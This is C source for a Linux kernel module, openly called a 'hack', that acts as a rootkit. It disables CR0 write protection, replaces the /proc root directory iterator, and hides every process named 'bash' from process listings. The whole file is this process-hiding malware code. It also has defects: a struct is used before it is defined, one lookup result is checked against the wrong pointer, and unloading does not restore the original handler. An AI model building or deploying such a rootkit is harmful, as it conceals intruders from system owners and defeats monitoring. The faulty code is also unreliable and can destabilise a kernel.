#include "/usr/src/linux-4.15/include/linux/kernel.h"
#include "/usr/src/linux-4.15/include/linux/module.h"
#include "/usr/src/linux-4.15/include/linux/sched.h"
#include "/usr/src/linux-4.15/include/linux/fs.h"
#include "/usr/src/linux-4.15/include/linux/file.h"
#include "/usr/src/linux-4.15/include/linux/proc_fs.h"
#include "/usr/src/linux-4.15/include/linux/init.h"
#include "/usr/src/linux-4.15/include/linux/types.h"
#include "/usr/src/linux-4.15/include/linux/sched.h"
#include "/usr/src/linux-4.15/include/linux/init_task.h"
#include "/usr/src/linux-4.15/include/linux/pid_namespace.h"
#include "/usr/src/linux-4.15/include/linux/idr.h"
#include "/usr/src/linux-4.15/include/linux/cred.h"
#include "/usr/src/linux-4.15/include/linux/ptrace.h"
#include "/usr/src/linux-4.15/include/linux/pid.h"
#include "/usr/src/linux-4.15/include/linux/dcache.h"
#include "/usr/src/linux-4.15/include/linux/kallsyms.h"
#include "/usr/src/linux-4.15/include/linux/string.h"
#define FIRST_PROCESS_ENTRY 256
#define PROC_NUMBUF 13
#define TGID_OFFSET (FIRST_PROCESS_ENTRY + 2)

MODULE_LICENSE("GPL");
MODULE_AUTHOR("CHS");

/*
the point of proc_readdir() and proc_root_readdir()
*/
typedef int (*hack_iterate_shared) (struct file *, struct dir_context *);
hack_iterate_shared origin_proc_root;
typedef int (*hack_proc_readdir)(struct file *file,struct dir_context *ctx);
hack_proc_readdir new_proc_readdir;
typedef int instantiate_t(struct inode *, struct dentry *,
				     struct task_struct *, const void *);

typedef struct tgid_iter (*hack_next_tgid)(struct pid_namespace *ns, struct tgid_iter iter);
hack_next_tgid new_next_tgid;

typedef bool (*hack_proc_fill_cache)(struct file *file, struct dir_context *ctx,
	const char *name, int len,
	instantiate_t instantiate, struct task_struct *task, const void *ptr);
hack_proc_fill_cache new_proc_fill_cache;
typedef int (*hack_proc_pid_instantiate)(struct inode *dir,
				   struct dentry * dentry,
				   struct task_struct *task, const void *ptr);
hack_proc_pid_instantiate new_proc_pid_instantiate;
typedef bool (*hack_ptrace_may_access)(struct task_struct *task, unsigned int mode);
hack_ptrace_may_access new_ptrace_may_access;

/*
set cr0 rw;
*/
void
set_addr_rw(void)
{
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  write_cr0(cr0);
}

/*
set cr0 ro;
*/
void
set_addr_ro(void)
{
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  write_cr0(cr0);
}

/*
The struct needed
*/
struct tgid_iter {
	unsigned int tgid;
	struct task_struct *task;
};

/*
new has_pid_permissions()
*/
static bool new_has_pid_permissions(struct pid_namespace *pid,
				 struct task_struct *task,
				 int hide_pid_min)
{
	new_ptrace_may_access = (hack_ptrace_may_access)kallsyms_lookup_name("ptrace_may_access");
	if(!new_proc_fill_cache){
		printk("ptrace_may_access err;");
		return false;
	}
	if (pid->hide_pid < hide_pid_min)
		return true;
	if (in_group_p(pid->pid_gid))
		return true;

	return new_ptrace_may_access(task, PTRACE_MODE_READ_FSCREDS);
}

/*
hack the function proc_pid_readdir(),we can decide to hide process by name;
*/
int new_proc_pid_readdir(struct file *file,struct dir_context *ctx){
	new_next_tgid = (hack_next_tgid)kallsyms_lookup_name("next_tgid");
	if(!new_next_tgid){
		printk("next_tgid err;");
		return -1;
	}

	new_proc_fill_cache = (hack_proc_fill_cache)kallsyms_lookup_name("proc_fill_cache");
	if(!new_proc_fill_cache){
		printk("proc_fill_cache err;");
		return -1;
	}
	new_proc_pid_instantiate = (hack_proc_pid_instantiate)kallsyms_lookup_name("proc_pid_instantiate");
	if(!new_proc_pid_instantiate){
		printk("proc_pid_instantiate err;");
		return -1;
	}
	struct tgid_iter iter;
	struct pid_namespace *ns = file_inode(file)->i_sb->s_fs_info;
	loff_t pos = ctx->pos;

	if (pos >= PID_MAX_LIMIT + TGID_OFFSET)
		return 0;

	if (pos == TGID_OFFSET - 2) {
		struct inode *inode = d_inode(ns->proc_self);
		if (!dir_emit(ctx, "self", 4, inode->i_ino, DT_LNK))
			return 0;
		ctx->pos = pos = pos + 1;
	}
	if (pos == TGID_OFFSET - 1) {
		struct inode *inode = d_inode(ns->proc_thread_self);
		if (!dir_emit(ctx, "thread-self", 11, inode->i_ino, DT_LNK))
			return 0;
		ctx->pos = pos = pos + 1;
	}
	iter.tgid = pos - TGID_OFFSET;
	iter.task = NULL;
	for (iter = new_next_tgid(ns, iter);
	     iter.task;
	     iter.tgid += 1, iter = new_next_tgid(ns, iter)) {
		char name[PROC_NUMBUF];
		int len;

		cond_resched();
		if (!new_has_pid_permissions(ns, iter.task, HIDEPID_INVISIBLE))
			continue;

		len = snprintf(name, sizeof(name), "%d", iter.tgid);
		ctx->pos = iter.tgid + TGID_OFFSET;
		if(strcmp("bash",iter.task->comm)==0){
			printk("Hidden process is [tgid:%d][pid:%d]:%s\n",ctx->pos,iter.task->pid,iter.task->comm);
			continue;
		}

		if (!new_proc_fill_cache(file, ctx, name, len,
				     new_proc_pid_instantiate, iter.task, NULL)) {
			put_task_struct(iter.task);
			return 0;
		}
	}
	ctx->pos = PID_MAX_LIMIT + TGID_OFFSET;
	return 0;

}

/*hack proc_root_readdir()*/
int hack_proc_root_readdir(struct file *file, struct dir_context *ctx){


	new_proc_readdir = (hack_proc_readdir)kallsyms_lookup_name("proc_readdir");
	if(!new_proc_readdir){
		printk("err;");
		return -1;
	}

	//printk("[address]proc_readdir=%lx\n",new_proc_readdir);


	if (ctx->pos < FIRST_PROCESS_ENTRY) {
		int error = new_proc_readdir(file, ctx);
		if (unlikely(error <= 0))
			return error;
		ctx->pos = FIRST_PROCESS_ENTRY;
	}

	return new_proc_pid_readdir(file,ctx);

}



int __init hack_kernel(void){
  printk("Kernel VFS hacked!!");
  struct file *getfile;
  struct file_operations *getfile_op;

  getfile = filp_open("/proc",O_RDONLY,0);
  if(IS_ERR(getfile)){
    printk("open proc error\n");
    return -1;
  }

  origin_proc_root = getfile->f_op->iterate_shared;
  getfile_op = getfile->f_op;
  set_addr_rw();
  getfile_op->iterate_shared = hack_proc_root_readdir;
  set_addr_ro();
  filp_close(getfile,0);

  return 0;
}

void __exit hack_kernel_exit(void){
  printk("hack kernel goodbye!!");
  return;
}
module_init(hack_kernel);
module_exit(hack_kernel_exit)
